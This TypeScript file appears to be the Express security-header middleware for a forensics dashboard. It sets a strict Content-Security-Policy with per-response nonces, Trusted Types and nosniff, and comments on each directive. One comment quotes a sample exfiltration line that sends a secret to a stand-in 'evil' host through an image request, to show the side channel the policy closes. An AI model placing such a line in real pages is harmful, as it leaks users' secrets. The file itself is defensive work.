import { randomBytes } from "node:crypto";
import type { Request, RequestHandler, Response, NextFunction } from "express";

/**
 * Content-Security-Policy for every companion response.
 *
 * WHY THIS EXISTS: the explain-panel XSS (#281) showed that evidence rendered in the dashboard has
 * to be treated as hostile. Issue #387 removed inline event/style attributes and put every dynamic
 * HTML or style write behind `public/js/safe-dom.js`. That makes a strict policy possible: a missed
 * escape is sanitized at the sink, and the browser independently refuses unapproved script/style.
 *
 * ── The directives ───────────────────────────────────────────────────────────────────────────
 *  - `default-src 'self'` — unexpected resource types stay on the companion origin.
 *  - `connect-src 'self'` — the dashboard makes zero
 *    cross-origin fetches (all enrichment is proxied server-side), so confining egress costs
 *    nothing and denies injected script its exfiltration channel: no beaconing case contents,
 *    API keys, or session state to an attacker host. XSS that cannot exfiltrate is far less useful.
 *    `'self'` also covers the same-origin `ws://…/ws` live feed (CSP3 matches ws/wss against the
 *    document's own origin).
 *  - `img-src 'self' data:` — `data:` is required: the dashboard inlines 27 data:image/svg icons.
 *    Pinning it still closes the classic `new Image().src = "https://evil/?" + secret` side channel.
 *  - `object-src 'none'` — `<object>`/`<embed>` are a script-execution path of their own.
 *  - `base-uri 'none'` — stops an injected `<base>` silently re-pointing every relative URL.
 *  - `form-action 'none'` — dashboard forms are handled by JavaScript and never navigate, so this
 *    is free; it stops an injected form POSTing anywhere.
 *  - `frame-ancestors 'none'` — clickjacking. Nothing frames the dashboard.
 *
 * Blob downloads (Sigma drafts, CSV exports) use `a[download]` with `URL.createObjectURL`; the
 * generated URL is navigated as a download, not loaded as a page resource. The `/mobile` PWA's
 * service worker and web manifest are same-origin.
 */
export const CSP_POLICY = [
  "default-src 'self'",
  "img-src 'self' data:",
  "connect-src 'self'",
  "object-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
  "frame-ancestors 'none'",
].join("; ");

/**
 * Marker the served HTML carries in place of a real nonce (`<script nonce="__CSP_NONCE__">`).
 * {@link withNonce} swaps it for the per-response value just before the document is sent.
 */
export const CSP_NONCE_PLACEHOLDER = "__CSP_NONCE__";

/**
 * {@link CSP_POLICY} plus the per-response script/style rules and Trusted Types enforcement.
 *
 * `'self'` covers the external bundles (/vendor/*, /js/*); the nonce covers the handful of inline
 * `<script>` blocks the pages still carry. Note what is NOT here: `'unsafe-inline'`. A CSP3 browser
 * ignores it once a nonce is present, but a CSP2-only client would honour it and happily run
 * injected inline script — which is the exact thing this is meant to stop.
 *
 * Inline event-handler/style attributes are not noncible. `*-src-attr 'none'` makes that explicit,
 * while nonce-bearing blocks hold the governed stylesheets and bootstrap scripts. Trusted Types is
 * enforced in Chromium; safe-dom patches the same sinks in Firefox.
 */
export function cspWithNonce(nonce: string): string {
  return [
    CSP_POLICY,
    `script-src 'self' 'nonce-${nonce}'`,
    "script-src-attr 'none'",
    `style-src 'self' 'nonce-${nonce}'`,
    "style-src-attr 'none'",
    "require-trusted-types-for 'script'",
    "trusted-types default dfir-parser dfir-safe-html",
  ].join("; ");
}

/** Stamp the per-response nonce into a served document. */
export function withNonce(html: string, nonce: string): string {
  return html.split(CSP_NONCE_PLACEHOLDER).join(nonce);
}

/**
 * Express middleware stamping the policy on every response.
 *
 * Applied to API responses as well as documents. A JSON body is not a script host, but a uniform
 * header costs nothing and leaves no route whose response an attacker can steer into a document
 * context without the policy attached.
 *
 * A fresh nonce is minted per response and published on `res.locals.cspNonce` so the HTML routes can
 * stamp the matching value into the document. Per-response is the point: a nonce reused across
 * requests is worth no more than `'unsafe-inline'`, because an attacker who can read one page can
 * embed that value in the payload they inject into the next.
 *
 * `X-Content-Type-Options: nosniff` rides along (#728). It was previously set on ONE route, the
 * geo-tile proxy, on the grounds that those bytes came from another server. Evidence has a better
 * claim: `GET /cases/:id/evidence/:file` serves imported artifact content — hostile by assumption
 * here — and answers an unrecognized suffix with `application/octet-stream`, which a sniffing
 * browser is otherwise free to re-read as a document. The CSP above is what actually denies such a
 * document its payload, so this is a second lock on a locked door; it is global rather than
 * per-route for the same reason `caseLockGate` is, namely that a per-route opt-in leaves every new
 * route one forgotten line away from shipping without it.
 */
export function createSecurityHeaders(): RequestHandler {
  return function securityHeaders(_req: Request, res: Response, next: NextFunction): void {
    const nonce = randomBytes(16).toString("base64");
    res.locals.cspNonce = nonce;
    res.setHeader("Content-Security-Policy", cspWithNonce(nonce));
    res.setHeader("X-Content-Type-Options", "nosniff");
    next();
  };
}
